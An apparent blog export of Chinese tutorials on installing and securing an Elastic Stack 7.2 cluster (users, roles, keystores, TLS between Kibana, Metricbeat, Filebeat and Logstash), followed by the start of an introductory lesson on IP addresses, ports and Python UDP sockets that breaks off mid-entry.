    <content type="text"><![CDATA[Elasticsearch安全功能使得可以轻松保护群集。 可以对数据进行基础的密码保护，并实施更高级的安全措施，例如加密通信，基于角色的访问控制，IP过滤和审计。在最新发行的es和kinaba版本中，basic级别的许可中已经开放了部分安全管理的功能特性，可以免费使用。详细信息参见：https://www.elastic.co/subscriptions依次停止Metricbeat、kibana和elasticsearch服务进程编辑ES_PATH_CONF/elasticsearch.yml文件，启用xpack服务添加以下内容：1xpack.security.enabled: true编辑ES_PATH_CONF/elasticsearch.yml文件，启用 single-node discovery功能1discovery.type: single-node通过将discovery.type设置为single-node， 在这种情况下，节点将选择自己作为主节点，并且不会加入任何其他节点的集群。启用Elasticsearch安全功能后，默认情况下会启用基本身份验证。 要与群集通信，必须指定用户名和密码。 除非启用了匿名访问，否则所有不包含用户名和密码的请求都将被拒绝。为内置用户创建密码有一些管理用途的集群内建用户，如apm_system, beats_system, elastic, kibana, logstash_system, and remote_monitoring_user，我们需要为其设置密码。这些内建管理用户的说明信息参见： https://www.elastic.co/guide/en/elastic-stack-overview/7.2/built-in-users.html启动es服务：1./bin/elasticsearch执行下面命令设置内建管理用户的密码：1./bin/elasticsearch-setup-passwords interactive这里设置的账号密码，在后续各种服务集成配置中会使用到，所以务必做好记录。该命令仅可以执行一次。123456elastic/elastic123apm_system/apm_system123kibana/kibana123logstash_system/logstash_system123beats_system/beats_system123remote_monitoring_user/remote_monitoring_user123账号与密码信息的管理这里又有两种方式进行配置，一个是直接将账号/密码维护在配置文件中。另一个方法是，把账号/密码存储到keystore密钥库中。后一种的安全性更高些。编辑 KIBANA_HOME/config/kibana.yml ：12elasticsearch.username: &quot;kibana&quot;elasticsearch.password: &quot;kibana123&quot;或者存储在keystore中：12345678# 放置历史操作记录被查看到set +o historyexport LOGSTASH_KEYSTORE_PASS=mypassword set -o history./bin/kibana-keystore create./bin/kibana-keystore add elasticsearch.username./bin/kibana-keystore add elasticsearch.password在提示输入时，根据提示输入kibana/kibana123的用户名和密码信息。该账号将被用于kibana访问es服务时使用。启动kibana服务：1./bin/kibana现在我们已经设置好了内置用户，需要决定如何管理所有其他用户。Elastic Stack对用户进行身份验证以确保它们有效。 身份验证过程由realm进行处理。 可以使用一个或多个内置realm，例如native，file，LDAP，PKI，Active Directory，SAML或Kerberos realm。 也可以创建自己的自定义realm。 在本教程中，我们将使用本机native realm，这也是basic许可所允许免费使用的用户身份验证方式之一。通常，可以通过在elasticsearch.yml文件中添加xpack.security.authc.realm设置来配置realm。 但是，如果未配置其他域，则默认情况下为使用本机native realm。 因此，无需在本教程中执行任何额外的配置步骤，就可以直接跳转到创建用户了！创建用户我们创建两个基于native realm的用户。使用浏览器打开kibana服务地址，会发现此时已经需要登录才能使用kibana服务了。1）使用elastic/elastic123账号，登录进入kibana。2）转到Management / Security / Users页面。3）点击Create new user，创建一个账号gqtest/gqtest123，但暂时先不设置Roles，该账号将作为查看kibana的个人账号使用。4）再创建一个logstash_internal/logstash_internal123用户，用于logstash向es写入数据时使用。5）配置角色授权每个角色定义一组特定的操作（如读取，创建或删除），这些操作可以在特定的安全资源（例如索引，别名，文档，字段或集群）上执行。 es已经提供了很多内置角色可以直接使用。打开Management / Security / Roles页面，查看系统内置的各种Roles。点击某个角色的名称，可以查看该角色都被授予了哪些权限。我们将kibana_user角色分配给你的用户。 返回Management / Security / Users页面并选择你的用户。 添加kibana_user角色并保存更改。该角色将提供kibana的所有使用权限。在实际使用中，我们可能需要为特定的用户创建专用的kibana账号，仅显示部分kibana功能菜单，同时控制各菜单项的读、写权限。这些可以通过在kibana上自定义Role角色来实现。详情配置方法参见：https://www.elastic.co/guide/en/kibana/7.2/kibana-role-management.html在前面配置步骤中，我们在Elasticsearch中存储Metricbeat数据。 让我们创建两个角色，授予对该数据的不同级别的访问权限。转到Management / Security / Roles页面，然后单击Create role。创建一个metricbeat_reader角色，该角色对metricbeat- 索引具有read和view_index_metadata特权：创建一个metricbert_writer角色，该角色具有manage_index_templates的权限并监视集群特权，以及对metricbeat- 索引的write, delete, create_index, manage的特权：Role metricbert_writer：现在返回Management / Security / Users页面并将这些角色分配给适当的用户。 将metricbeat_reader角色分配给你的个人用户。 将metricbeat_writer角色分配给logstash_internal用户。如果需要了解更多的授权和角色管理知识，请参见：https://www.elastic.co/guide/en/elastic-stack-overview/7.2/authorization.html6）配置Logstash或Metricbeat使用es账号Logstash的配置方法参见：https://www.elastic.co/guide/en/elastic-stack-overview/7.2/get-started-logstash-user.htmlMetricbeat配置使用es账号创建一个keystore密钥库：1./metricbeat keystore create将敏感的密码信息存放在密钥库里：1./metricbeat keystore add ES_PWD使用账号metricbeat_internal/metricbeat_internal123，将其密码信息保存于keystore中的ES_PWD变量中。metricbeat_internal是我们创建的一个用户，授予了beats_system, kibana_user，metricbert_writer这3个角色权限。查看与删除的方法：12./metricbeat keystore list./metricbeat keystore remove ES_PWD编辑metricbeat.yml配置文件：12345678910111213setup.kibana: host: &quot;es-node1:5601&quot; username: &quot;metricbeat_internal&quot; password: &quot;$&#123;ES_PWD&#125;&quot;#-------------------------- Elasticsearch output ------------------------------output.elasticsearch: # Array of hosts to connect to. hosts: [&quot;localhost:9200&quot;] # Optional protocol and basic auth credentials. #protocol: &quot;https&quot; username: &quot;beats_system&quot; password: &quot;$&#123;ES_PWD&#125;&quot;启动Metricbeat服务：1./metricbeat -e回到kibana的web页面，使用之前创建的gqtest/gqtest123账号登录并查看系统指标数据，该账号具有metricbeat_reader 和 kibana_user的授权。可以看到Metricbeat采集的系统指标数据正常写入elasticsearch，且在kibana上正常展示，则可以继续配置下面的步骤。]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[elastic stack 7.2技术栈【三】部署单机版本的elasticsearch技术栈]]></title>
    <url>%2F2019%2F12%2F31%2Felastic%20stack%207.2%E6%8A%80%E6%9C%AF%E6%A0%88%E3%80%90%E4%B8%89%E3%80%91%E2%80%94%E2%80%94%20%E9%83%A8%E7%BD%B2%E5%8D%95%E6%9C%BA%E7%89%88%E6%9C%AC%E7%9A%84elasticsearch%E6%8A%80%E6%9C%AF%E6%A0%88%2F</url>
    <content type="text"><![CDATA[在节点1上面安装单节点es12curl -L -O https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.2.0-linux-x86_64.tar.gztar -xzvf elasticsearch-7.2.0-linux-x86_64.tar.gz对elasticsearch.yml几个重要配置参数进行设置：1234cluster.name: my-elasticnode.name: es-node1# network.host: 10.20.0.11bootstrap.memory_lock: true暂不能启用network.host参数，否则会触发es的强调集群配置检查，因为es集群配置还不完整，所以这会导致启动失败启动es服务：12cd elasticsearch-7.2.0./bin/elasticsearch检测下服务是否正常启动：1curl http://10.20.0.11:9200在节点1上安装kibana123curl -L -O https://artifacts.elastic.co/downloads/kibana/kibana-7.2.0-linux-x86_64.tar.gztar xzvf kibana-7.2.0-linux-x86_64.tar.gzcd kibana-7.2.0-linux-x86_64/编辑config/kibana.yml文件：12elasticsearch.hosts: [&quot;http://10.20.0.11:9200&quot;]server.host: &quot;es-node1&quot;启动：1./bin/kibana调整防火墙放行规则：12firewall-cmd --permanent --zone=public --add-port=5601/tcpfirewall-cmd --reload检测服务是否正常启动：1curl http://10.20.0.11:5601在节点1上安装BeatsBeats针对不同的使用场景，分别提供了不同的工具实现。这里我们使用Metricbeat对节点主机的系统进行监控。Metricbeat提供预构建的模块，可以使用它们快速实施和部署系统监控解决方案。12curl -L -O https://artifacts.elastic.co/downloads/beats/metricbeat/metricbeat-7.2.0-linux-x86_64.tar.gztar xzvf metricbeat-7.2.0-linux-x86_64.tar.gz在这里，我们将运行Metricbeat的system模块以从服务器上运行的操作系统和服务收集指标。system模块收集系统级指标，例如CPU使用率，内存，文件系统，磁盘IO和网络IO统计信息，以及系统上运行的每个进程的类似顶级的统计信息。启用system模块：1./metricbeat modules enable system初始化数据：1./metricbeat setup -e如果前一步中kibana服务绑定的网卡变更为对外服务的网卡了，则在执行这个命令前请修改metricbeat.yml文件中kibana服务地址的定义。启动Metricbeat服务：1./metricbeat -e要看可视化系统指标，请打开浏览器并导航到Metricbeat系统概述仪表板：http://10.20.0.11:5601/app/kibana#/dashboard/Metricbeat-system-overview-ecs至此，单机版本的部署完成，在部署结果通过验收后，进入下一步骤，启用和配置出es安全管理功能。]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[elastic stack 7.2技术栈【七】启用Metricbeat的安全性配置]]></title>
    <url>%2F2019%2F12%2F31%2Felastic%20stack%207.2%E6%8A%80%E6%9C%AF%E6%A0%88%E3%80%90%E4%B8%83%E3%80%91%E2%80%94%E2%80%94%E5%90%AF%E7%94%A8Metricbeat%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[我们使用Metricbeat采集es主机节点的系统监控指标数据，以及监控es集群中索引等服务。对每个es服务节点编辑elasticsearch.yml，以启用监控数据采集1xpack.monitoring.collection.enabled: true在每个节点的metricbeat部署目录下，启用elasticsearch-xpack模块1./metricbeat modules enable elasticsearch-xpack进入elasticsearch部署目录，为每个节点上的Metricbeat制作一个数字证书123./bin/elasticsearch-certutil cert --ca elastic-stack-ca.p12 --name es-node1 --ip 10.20.0.11 --pem./bin/elasticsearch-certutil cert --ca elastic-stack-ca.p12 --name es-node2 --ip 10.20.0.12 --pem./bin/elasticsearch-certutil cert --ca elastic-stack-ca.p12 --name es-node3 --ip 10.20.0.13 --pem执行以上命令，将输出结果分别保存为es-node1.zip es-node2.zip es-node3.zip将压缩包解压后的证书文件，分别部署到每个主机节点上Metricbeat下的certs子目录中，文件属主elastic.elastic，访问权限600因为我们使用的是自签CA证书，所以还需要把CA证书公钥文件cacert.pem，同样在certs目录中放一份编辑modules.d/elasticsearch-xpack.yml文件123456789101112131415161718- module: elasticsearch metricsets: - ccr - cluster_stats - index - index_recovery - index_summary - ml_job - node_stats - shard period: 10s hosts: [&quot;https://10.20.0.11:9200&quot;] username: &quot;remote_monitoring_user&quot; password: &quot;remote_monitoring_user123&quot; ssl.certificate_authorities: [&quot;certs/cacert.pem&quot;] ssl.certificate: &quot;certs/es-node1.crt&quot; ssl.key: &quot;certs/es-node1.key&quot; xpack.enabled: true这里使用了一个es提供的内建管理账号remote_monitoring_user编辑metricbeat.yml文件在节点1上面：12345678910111213setup.kibana: host: &quot;https://es-node1:5601&quot; username: &quot;metricbeat_internal&quot; password: &quot;$&#123;ES_PWD&#125;&quot;output.elasticsearch: hosts: [&quot;10.20.0.11:9200&quot;] protocol: &quot;https&quot; ssl.certificate_authorities: [&quot;certs/cacert.pem&quot;] username: &quot;metricbeat_internal&quot; password: &quot;$&#123;ES_PWD&#125;&quot; ssl.certificate: &quot;certs/es-node1.crt&quot; ssl.key: &quot;certs/es-node1.key&quot;在这里我们使用前面章节中创建的账号metricbeat_internal同时作为metricbeat访问kibana和elasticsearch时的授权账号；需要注意的是，在启用了es安全特性后，metricbeat采集和向es索引写入监控指标数据时需要拥有适当的角色授权，请使用elastic账号登录kibana并为metricbeat_internal用户增加remote_monitoring_collector、remote_monitoring_agent两个角色的授权。参照上面的说明，对节点2和节点3上的Metricbeat配置文件metricbeat.yml进行修改，注意要引用本节点的密钥文件名。启动Metricbeat服务1./metricbeat -e确认日志输出中没有需要引起注意的warning或error信息登录kibana并查看Stack Monitor页面，如果能正常看到以下内容则表示监控数据采集和展示是正确的]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[elastic stack 7.2技术栈【六】启用Kibana中的安全性配置]]></title>
    <url>%2F2019%2F12%2F31%2Felastic%20stack%207.2%E6%8A%80%E6%9C%AF%E6%A0%88%E3%80%90%E5%85%AD%E3%80%91%E2%80%94%E2%80%94%E5%90%AF%E7%94%A8Kibana%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[本章节主要包括配置kibana的会话安全和加密通信两项内容。配置xpack.security.encryptionKey属性用于加密cookie中的凭据的任意字符串，长度不超过32个字符。 至关重要的是，这个密钥不会暴露给Kibana的用户。 默认情况下，会在内存中自动生成一个值。 如果使用该默认行为，则在Kibana重新启动时，所有会话都将失效。设置会话超时时间为30min。在kibana.yml配置文件中：12xpack.security.encryptionKey: &quot;something_at_least_32_characters&quot;xpack.security.sessionTimeout: 1800000配置kibana使用https访问es服务在节点1上es家目录下，为kibana服务制作数字证书：1./bin/elasticsearch-certutil cert --ca elastic-stack-ca.p12 --name es-node1 --ip 10.20.0.11 --pem将得到的证书文件存放到kibana部署路径的配置文件目录下certs子目录中：1234[elastic@es-node1 certs]$ pwd/opt/kibana-7.2.0-linux-x86_64/config/certs[elastic@es-node1 certs]$ lses-node1.crt es-node1.key在kibana.yml文件中为kibana配置ssl的相关参数123server.ssl.enabled: trueserver.ssl.key: config/certs/es-node1.keyserver.ssl.certificate: config/certs/es-node1.crt此时，启动kibana服务，验证通过 https://10.20.0.11:5601 是否可以成功访问网站。至此，我们在访问kibana服务时已经实现的加密通信。接下来，继续将kibana访问elasticsearch服务的过程切换到https加密通信。配置kibana通过https访问elasticsearch因为我们使用的是自签名证书，所以需要为kibana提供ca证书。我们先在节点1上，将pkcs12格式的ca证书转换为kibana适用的pem格式，其中cacert.pem是证书公钥文件。12openssl pkcs12 -nocerts -nodes -in elastic-stack-ca.p12 -out private.pemopenssl pkcs12 -clcerts -nokeys -in elastic-stack-ca.p12 -out cacert.pem在kibana.yml文件中配置elasticsearch.hosts参数，并指定ca证书文件位置：：12elasticsearch.hosts: [&quot;https://10.20.0.11:9200&quot;]elasticsearch.ssl.certificateAuthorities: [ &quot;config/certs/cacert.pem&quot; ]将Kibana配置为通过HTTPS连接到Elasticsearch监控集群，在这里我们使用的是同一个es集群：12xpack.monitoring.elasticsearch.hosts: [&quot;https://10.20.0.11:9200&quot;]xpack.monitoring.elasticsearch.ssl.certificateAuthorities: config/certs/cacert.pem配置三个节点上的elasticsearch服务，在elasticsearch.yml文件中补充以下http.ssl服务使用的配置参数：123xpack.security.http.ssl.enabled: truexpack.security.http.ssl.keystore.path: certs/$&#123;node.name&#125;.p12xpack.security.http.ssl.truststore.path: certs/$&#123;node.name&#125;.p12将http.ssl访问证书时使用的密码信息存储在密钥库中：12bin/elasticsearch-keystore add xpack.security.http.ssl.keystore.secure_passwordbin/elasticsearch-keystore add xpack.security.http.ssl.truststore.secure_password在前面章节中我们为节点证书设置的密码是：es-node123三个es节点上均需要设置重启服务进程并验证配置结果重启三节点上的es服务进程：bin/elasticsearch重启节点1上的kibana服务进程：bin/kibana看到下面这样的日志输出时，可以确认配置成功了：12log [18:46:19.967] [info][listening] Server running at https://es-node1:5601log [18:46:19.997] [info][status][plugin:spaces@7.2.0] Status changed from yellow to green - Read]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[elastic stack 7.2技术栈【二】操作系统的初始化配置]]></title>
    <url>%2F2019%2F12%2F31%2Felastic%20stack%207.2%E6%8A%80%E6%9C%AF%E6%A0%88%E3%80%90%E4%BA%8C%E3%80%91%E2%80%94%E2%80%94%20%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[操作系统使用centos7 minimual版本。elasticsearch技术栈均采用 7.2版本，默认使用basic许可，可免费使用xpack部分安全管理服务。部署使用的主机资源规划使用3个主机节点10.20.0.11 es-node110.20.0.12 es-node210.20.0.13 es-node3升级至最新的系统小版本1yum -y update &amp;&amp; hostnamectl set-hostname es-node1在设置节点2，节点3时请注意变更为正确的主机名禁用swap因为es是在jvm中运行的，在内存使用上涉及不到使用swap。12swapoff -ased -i &apos;/swap/d&apos; /etc/fstab系统可用资源限制文件句柄与最大线程并发数量：12345678cat &lt;&lt; EOF &gt;&gt; /etc/security/limits.conf* soft nofile 65535* hard nofile 65535* soft nproc 4096* hard nproc 4096* soft memlock unlimited* hard memlock unlimitedEOF虚拟内存Elasticsearch uses a mmapfs directory by default to store its indices.12345cat &lt;&lt; EOF &gt;&gt; /etc/sysctl.confvm.max_map_count=262144EOFsysctl -pMMap FS类型通过将文件映射到内存（mmap）来将分片索引存储在文件系统上（映射到Lucene MMapDirectory）。 内存映射使用进程中虚拟内存地址空间的一部分等于要映射的文件的大小。 在使用此类之前，请确保您已经拥有足够的虚拟地址空间。创建es专用的系统用户useradd elastic配置firewalld防火墙规则123firewall-cmd --zone=public --permanent --add-rich-rule=&quot;rule family=&apos;ipv4&apos; source address=&apos;10.20.0.0/24&apos; accept&quot;firewall-cmd --reloadfirewall-cmd --list-all关闭selinux12setenforce 0sed -i &apos;/SELINUX/s/enforcing/disabled/&apos; /etc/selinux/config配置/etc/hosts12345cat &lt;&lt; EOF &gt;&gt; /etc/hosts10.20.0.11 es-node110.20.0.12 es-node210.20.0.13 es-node3EOF重启系统验证各项配置生效后，继续本系列文章的下面章节的配置。]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[elastic stack 7.2技术栈【八】Filebeat与Logstash两个工具之间怎样配置SSL加密通信]]></title>
    <url>%2F2019%2F12%2F31%2Felastic%20stack%207.2%E6%8A%80%E6%9C%AF%E6%A0%88%E3%80%90%E5%85%AB%E3%80%91%E2%80%94%E2%80%94%20Filebeat%E4%B8%8ELogstash%E4%B8%A4%E4%B8%AA%E5%B7%A5%E5%85%B7%E4%B9%8B%E9%97%B4%E6%80%8E%E6%A0%B7%E9%85%8D%E7%BD%AESSL%E5%8A%A0%E5%AF%86%E9%80%9A%E4%BF%A1%2F</url>
    <content type="text"><![CDATA[在目前比较流行的技术实践方案里，Filebeat大多用作日志采集工具，虽然它可以直接将数据写入Elasticsearch中，但出于各方面的效率考虑，一般都会通过Logstash做一个日志数据的汇聚、转换和分发处理。为了保证应用日志数据的传输安全，我们可以使用SSL相互身份验证来保护Filebeat和Logstash之间的连接。 这可以确保Filebeat仅将加密数据发送到受信任的Logstash服务器，并确保Logstash服务器仅从受信任的Filebeat客户端接收数据。下面就讲述一下配置Filebeat与Logstash之间进行加密通信的方法。全文是在CentOS7上基于Elastic 7.2技术栈所验证的。我们需要一个自签的CA证书，以及使用该CA证书签署的两份数据证书。一份是给Logstash作为server端验证自己身份时使用，一份是提供给Filebeat客户端验证自己身份使用。在这里，我们是直接利用的Elasticsearch随安装包提供的数字证书工具elasticsearch-certutil来制作需要的证书。如果您需要对该工具做更多的了解，参考官网的这个资料：elasticsearch-certutil制作自签的CA证书在Linux下，进入到Elasticsearch程序的部署家目录中，执行以下命令可以生成一份自签的CA证书：1./bin/elasticsearch-certutil ca使用默认输出文件名elastic-stack-ca.p12，并为证书设置访问口令。根据证书文件导出一份CA公钥文件，用于后续各应用配置文件中引用CA公钥时使用：1openssl pkcs12 -clcerts -nokeys -in elastic-stack-ca.p12 -out cacert.pem制作Logstash使用的数字证书Logstash服务在启用SSL加密通信支持时，会有一个特殊的问题。因为Logstash在底层是通过集成了Netty来提供的对外服务端口，而Netty在支持数字证书这一功能上面，有一个局限性，即Netty仅支持使用PKCS#8的密钥格式。对于我们使用最多的PEM格式证书，Logstash会毫不留情地打印出以下异常信息：123456[2019-08-06T14:48:35,643][ERROR][logstash.inputs.beats ] Looks like you either have a bad certificate, an invalid key or your private key was not in PKCS8 format.[2019-08-06T14:48:35,643][WARN ][io.netty.channel.ChannelInitializer] Failed to initialize a channel. Closing: [id: 0x81e7ac55, L:/172.17.0.6:5044 - R:/100.200.106.60:32500]java.lang.IllegalArgumentException: File does not contain valid private key: /data/logstash/config/certs/logstash.key at io.netty.handler.ssl.SslContextBuilder.keyManager(SslContextBuilder.java:270) ~[netty-all-4.1.30.Final.jar:4.1.30.Final] at io.netty.handler.ssl.SslContextBuilder.forServer(SslContextBuilder.java:90) ~[netty-all-4.1.30.Final.jar:4.1.30.Final] at org.logstash.netty.SslSimpleBuilder.build(SslSimpleBuilder.java:112) ~[logstash-input-beats-6.0.0.jar:?]由于Elastic官网上对于Filebeat和Logstash之间配置SSL加密通信时的说明资料对制作Logstash使用的数字证书的操作一带而过，只是简单的说既可以使用elasticsearch自带的证书工具，也可以使用通用的openssl。所以，按照Elastic技术栈中处理其它工具配置SSL功能支持时的方法，制作和得到PEM格式的证书后，便会遇到Logstash抛出的上面的异常信息了。由于Logstash打印的错误信息比较多，分析了很长时间才定位到是由于未使用PKCS8密钥格式所引发的。有兴趣进一步了解Netty这方面配置特性的同学，可以参考这个链接：https://netty.io/wiki/sslcontextbuilder-and-private-key.html 。制作Logstash Server证书的正确方法1234./bin/elasticsearch-certutil cert --ca elastic-stack-ca.p12 --name logstash --dns testserver --ip 172.17.0.6 --pemunzip certificate-bundle.zipcd logstashopenssl pkcs8 -in logstash.key -topk8 -nocrypt -out logstash.p8经由命令1，我们使用自签的CA签署生成了一份名为logstash的数字证书；得到的数字证书是pem格式的，解压后会各有一个.key和.crt后缀的文件；命令3，使用openssl转换出一份PKCS#8格式的密钥文件，即logstash.p8；对于我们制作的logstash.crt的证书，可以使用以下命令查看证书中的信息：1openssl x509 -in logstash.crt -text将证书文件部署到Logstash配置目录下假定我们部署Logstash的路径为/data/logstash ，我们创建下面这样的证书存放目录，并把包括logstash证书和ca证书在内的文件部署于此。1234mkdir /data/logstash/config/certs$ ls /data/logstash/config/certscacert.pem logstash.crt logstash.key logstash.p8安全起见，将以上文件权限调整为600 。为Filebeat服务制作和配置数字证书回到刚才我们制作CA证书的地方，继续为Filebeat生成一份数字证书：1./bin/elasticsearch-certutil cert --ca elastic-stack-ca.p12 --name filebeat --dns test-filebeat --pem在生成证书时至少需要提供–dns参数的值，可以使用逗号分隔指定多个，简单处理的话可以直接指定为Filebeat工具所在主机的hostname即可。也可以使用–ip为证书绑定IP地址，或者二者同时使用。最终会得到一个zip文件，内含PEM格式的证书与密钥文件。请将得到的数字证书和密钥文件，以及ca证书文件，存放到Filebeat以下部署路径中：1234mkdir /data/filebeat/certsls /data/filebeat/certsfilebeat.crt filebeat.key cacert.pem安全起见，将以上文件权限调整为600 。配置Filebeat使用SSL编辑filebeat.yml文件，参照以下内容进行配置：12345output.logstash: hosts: [&quot;log.mytestserver.com:5044&quot;] ssl.certificate_authorities: [&quot;/data/filebeat/certs/cacert.pem&quot;] ssl.certificate: &quot;/data/filebeat/certs/filebeat.crt&quot; ssl.key: &quot;/data/filebeat/certs/filebeat.key&quot;配置Logstash在通过beats接收日志数据时使用SSL1234567891011121314input &#123; beats &#123; id =&gt; &quot;logstash-1&quot; port =&gt; 5044 codec =&gt; plain &#123; charset =&gt; &quot;UTF-8&quot; &#125; ssl =&gt; true ssl_certificate_authorities =&gt; [&quot;/data/logstash/config/certs/cacert.pem&quot;] ssl_certificate =&gt; &quot;/data/logstash/config/certs/logstash.crt&quot; ssl_key =&gt; &quot;/data/logstash/config/certs/logstash.p8&quot; ssl_verify_mode =&gt; &quot;force_peer&quot; &#125;&#125;如上所示，在ssl_key参数中，引用的是我们制作的PCKS#8格式的密钥文件。Logstash的filter和output插件配置不是本文的重点，这里直接省略掉了。启动Filebeat服务并观察日志观察日志输出，显示有类似以下信息时表示Filebeat正常连接到Logstash服务且SSL功能工作正常。122019-08-06T16:29:08.745+0800 INFO pipeline/output.go:95 Connecting to backoff(async(tcp://log.mytestserver.com:5044))2019-08-06T16:29:08.992+0800 INFO pipeline/output.go:105 Connection to backoff(async(tcp://log.mytestserver.com:5044)) established参考材料：https://www.elastic.co/guide/en/beats/filebeat/7.2/configuring-ssl-logstash.html]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络_udp]]></title>
    <url>%2F2019%2F12%2F31%2F%E7%BD%91%E7%BB%9C_udp%2F</url>
    <content type="text"><![CDATA[网络通信概述什么是网络一种辅助双方或者多方能够连接在一起的工具使用网络的目的就是为了联通多方然后进行通信用的，即把数据从一方传递给另外一方,为了让在不同的电脑上运行的软件之间能够互相传递数据，就需要借助网络的功能小总结:使用网络能够把多方链接在一起，然后可以进行数据传递所谓的网络编程就是，让在不同的电脑上的软件能够进行数据传递，即进程之间的通信IP地址什么是IP地址用来在网络中标记一台电脑，比如192.168.1.1；在本地局域网上是唯一的。ip地址的作用ip地址的分类（了解）每一个IP地址包括两部分：网络地址和主机地址A类IP地址一个A类IP地址由1字节的网络地址和3字节主机地址组成，网络地址的最高位必须是“0”，地址范围1.0.0.1-126.255.255.254二进制表示为：00000001 00000000 00000000 00000001 - 01111110 11111111 11111111 11111110可用的A类网络有126个，每个网络能容纳1677214个主机B类IP地址一个B类IP地址由2个字节的网络地址和2个字节的主机地址组成，网络地址的最高位必须是“10”，地址范围128.1.0.1-191.255.255.254二进制表示为：10000000 00000001 00000000 00000001 - 10111111 11111111 11111111 11111110可用的B类网络有16384个，每个网络能容纳65534主机C类IP地址一个C类IP地址由3字节的网络地址和1字节的主机地址组成，网络地址的最高位必须是“110”范围192.0.1.1-223.255.255.254二进制表示为: 11000000 00000000 00000001 00000001 - 11011111 11111111 11111110 11111110C类网络可达2097152个，每个网络能容纳254个主机D类地址用于多点广播D类IP地址第一个字节以“1110”开始，它是一个专门保留的地址。它并不指向特定的网络，目前这一类地址被用在多点广播（Multicast）中多点广播地址用来一次寻址一组计算机 s 地址范围224.0.0.1-239.255.255.254E类IP地址以“1111”开始，为将来使用保留E类地址保留，仅作实验和开发用私有ip在这么多网络IP中，国际规定有一部分IP地址是用于我们的局域网使用，也就是属于私网IP，不在公网中使用的，它们的范围是：10.0.0.0～10.255.255.255172.16.0.0～172.31.255.255192.168.0.0～192.168.255.255注意IP地址127．0．0．1~127．255．255．255用于回路测试，如：127.0.0.1可以代表本机IP地址，用http://127.0.0.1就可以测试本机中配置的Web服务器。Linux命令(ping, ifconfig)查看或配置网卡信息：ifconfig敲：ifconfig，它会显示所有网卡的信息测试远程主机连通性：ping通常用ping来检测网络是否正常端口什么是端口端口就好一个房子的门，是出入这间房子的必经之路。如果一个程序需要收发网络数据，那么就需要有这样的端口.在linux系统中，端口可以有65536（2的16次方）个之多！既然有这么多，操作系统为了统一管理，所以进行了编号，这就是端口号。端口号端口是通过端口号来标记的，端口号只有整数，范围是从0到65535注意：端口数不一样的*nix系统不一样，还可以手动修改端口是怎样分配的端口号不是随意使用的，而是按照一定的规定进行分配。端口的分类标准有好几种，我们这里不做详细讲解，只介绍一下知名端口和动态端口知名端口（Well Known Ports）知名端口是众所周知的端口号，范围从0到102380端口分配给HTTP服务21端口分配给FTP服务可以理解为，一些常用的功能使用的号码是估计的，好比 电话号码110、10086、10010一样一般情况下，如果一个程序需要使用知名端口的需要有root权限。动态端口（Dynamic Ports）动态端口的范围是从1024到65535之所以称为动态端口，是因为它一般不固定分配某种服务，而是动态分配。动态分配是指当一个系统程序或应用程序程序需要网络通信时，它向主机申请一个端口，主机从可用的端口号中分配一个供它使用。当这个程序关闭时，同时也就释放了所占用的端口号。怎样查看端口 ？用“netstat －an”查看端口状态lsof -i [tcp/udp]:2425小总结端口有什么用呢 ？ 我们知道，一台拥有IP地址的主机可以提供许多服务，比如HTTP（万维网服务）、FTP（文件传输）、SMTP（电子邮件）等，这些服务完全可以通过1个IP地址来实现。那么，主机是怎样区分不同的网络服务呢？显然不能只靠IP地址，因为IP地址与网络服务的关系是一对多的关系。实际上是通过“IP地址+端口号”来区分不同的服务的。 需要注意的是，端口并不是一一对应的。比如你的电脑作为客户机访问一台WWW服务器时，WWW服务器使用“80”端口与你的电脑通信，但你的电脑则可能使用“3457”这样的端口。socket简介不同电脑上的进程之间如何通信首要解决的问题是如何唯一标识一个进程，否则通信无从谈起！在1台电脑上可以通过进程号（PID）来唯一标识一个进程，但是在网络中这是行不通的。其实TCP/IP协议族已经帮我们解决了这个问题，网络层的“ip地址”可以唯一标识网络中的主机，而传输层的“协议+端口”可以唯一标识主机中的应用进程（进程）。这样利用ip地址，协议，端口就可以标识网络的进程了，网络中的进程通信就可以利用这个标志与其它进程进行交互。注意:所谓进程指的是：运行的程序以及运行时用到的资源这个整体称之为进程（在讲解多任务编程时进行详细讲解）所谓进程间通信指的是：运行的程序之间的数据共享后面课程中会详细说到，像网络层等知识，不要着急什么是socketsocket(简称 套接字) 是进程间通信的一种方式，它与其他进程间通信的一个主要不同是：它能实现不同主机间的进程间通信，我们网络上各种各样的服务大多都是基于 Socket 来完成通信的例如我们每天浏览网页、QQ 聊天、收发 email 等等socket套接字走的是全双工创建socket在 Python 中 使用socket 模块的函数 socket 就可以完成：12import socketsocket.socket(AddressFamily, Type)说明：函数 socket.socket 创建一个 socket，该函数带有两个参数：Address Family：可以选择 AF_INET（用于 Internet 进程间通信） 或者 AF_UNIX（用于同一台机器进程间通信）,实际工作中常用AF_INETType：套接字类型，可以是 SOCK_STREAM（流式套接字，主要用于 TCP 协议）或者 SOCK_DGRAM（数据报套接字，主要用于 UDP 协议）创建一个tcp socket（tcp套接字）123456789import socket# 创建tcp的套接字s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)# ...这里是使用套接字的功能（省略）...# 不用的时候，关闭套接字s.close()创建一个udp socket（udp套接字）123456789import socket# 创建udp的套接字s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)# ...这里是使用套接字的功能（省略）...# 